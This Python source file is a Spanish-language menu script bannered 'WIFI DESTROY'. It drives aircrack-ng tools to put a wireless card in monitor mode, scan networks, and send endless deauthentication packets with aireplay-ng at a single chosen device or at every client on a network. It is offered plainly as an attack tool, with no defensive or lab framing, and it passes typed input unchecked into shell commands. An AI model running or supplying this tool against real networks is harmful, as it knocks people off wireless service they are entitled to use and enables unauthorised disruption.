import colorama
import os
from colorama import Fore
os.system("clear")
colorama.init()
import sys
import time



def loading_animation(duration, interval=0.1):
    total_iterations = int(duration / interval)
    for i in range(total_iterations):
        sys.stdout.write("\rCargando... |")
        sys.stdout.flush()
        time.sleep(interval)
        sys.stdout.write("\rCargando... /")
        sys.stdout.flush()
        time.sleep(interval)
        sys.stdout.write("\rCargando... -")
        sys.stdout.flush()
        time.sleep(interval)
        sys.stdout.write("\rCargando... \\")
        sys.stdout.flush()
        time.sleep(interval)

    sys.stdout.write("\rCargando... Listo!\n")











#Funciones

def msinterfaz():
    os.system("iwconfig")
    os.system("ifconfig")

def activmon():
    tarj = input("Escribe tu targeta de red ej (wlan0 or wlan0mon): ")
    os.system(f"sudo airmon-ng start {tarj}")
    
def desactmon():
    tarj = input("Escribe tu targeta de red ej (wlan0 or wlan0mon): ")
    os.system(f"sudo airmon-ng stop {tarj}")
    
def scanallwifi():
    tarj = input("Escribe tu targeta de red ej (wlan0 or wlan0mon): ")
    loading_animation(2)
    os.system(f"sudo airodump-ng {tarj}")

def monitred():
    bssid = input("Escribe el BSSID: ") 
    ch = input("Escribe el Canal (CH): ")
    tarj = input("Escribe tu targeta de red ej (wlan0 or wlan0mon): ")
    os.system(f"sudo airodump-ng -c {ch} --bssid {bssid} {tarj}")
    
def atackdisp():
    bssid = input("Escribe el BSSID: ") 
    stat = input("Escribe la stacion (STATION): ")
    tarj = input("Escribe tu targeta de red ej (wlan0 or wlan0mon): ")
    os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c {stat} {tarj}")

def atackred():
    bssid = input("Escribe el BSSID: ")
    tarj = input("Escribe tu targeta de red ej (wlan0 or wlan0mon): ")
    os.system(f"sudo aireplay-ng -0 0 -a {bssid} {tarj}")


#####################################
    
    
    


def banner():
    
    Banner = ("""
    ░██╗░░░░░░░██╗██╗███████╗██╗  ██████╗░███████╗░██████╗████████╗██████╗░░█████╗░██╗░░░██╗
    ░██║░░██╗░░██║██║██╔════╝██║  ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗░██╔╝
    ░╚██╗████╗██╔╝██║█████╗░░██║  ██║░░██║█████╗░░╚█████╗░░░░██║░░░██████╔╝██║░░██║░╚████╔╝░
    ░░████╔═████║░██║██╔══╝░░██║  ██║░░██║██╔══╝░░░╚═══██╗░░░██║░░░██╔══██╗██║░░██║░░╚██╔╝░░
    ░░╚██╔╝░╚██╔╝░██║██║░░░░░██║  ██████╔╝███████╗██████╔╝░░░██║░░░██║░░██║╚█████╔╝░░░██║░░░
    ░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═════╝░╚══════╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░
    """)
    print(Fore.CYAN+Banner+Fore.RESET)
    by = "𝘾𝙤𝙙𝙚 𝘽𝙮 @𝘾𝙧𝙞𝙛𝙩𝙘𝙠𝙞𝙣𝙜 | @𝙂𝙝𝙤𝙨𝙩𝙃𝙖𝙩_𝙍𝙚𝙖𝙡"
    print(Fore.BLUE+by+Fore.RESET)
    
banner()


def limpiar():
    os.system("clear")



def iniciar():



    

    menu = "\nMenu: \n[0]- Limpiar Pantalla\n[1]- Mostrar Interfaz de red\n[2]- Activar modo Monitor\n[3]- Desactivar modo Monitor\n[4]- Escanear todas las Redes WIFI\n[5]- Monitorea La Red\n[6]- Atacar Un Dispositivo\n[7]- Atacar toda la Red"

    
    
    print(Fore.LIGHTYELLOW_EX+menu+Fore.RESET)



    opcion = (input("Elige una opcion---> "))
    #Interfaz
    if int(opcion) == 1:
        msinterfaz()
        iniciar()
        #Limpiar
    elif int(opcion) == 0:
        limpiar()
        iniciar()
        #Activ mon
    elif int(opcion) == 2:
        activmon()
        iniciar()
        #Desactiv Mon
    elif int(opcion) == 3:
        desactmon()
        iniciar()
    elif int(opcion) == 4:
        print(Fore.RED+"Recuerda precionar CTRL + X para salir"+Fore.RESET)
        scanallwifi()
        iniciar()
    elif int(opcion) == 5:
        print(Fore.RED+"Recuerda precionar CTRL + X para salir"+Fore.RESET)
        monitred()
        iniciar()
    elif int(opcion) == 6:
        print(Fore.RED+"Recuerda precionar CTRL + X para salir"+Fore.RESET)
        atackdisp()
        iniciar()
    elif int(opcion) == 7:
        print(Fore.RED+"Recuerda precionar CTRL + X para salir"+Fore.RESET)
        atackred()
        iniciar()




iniciar()



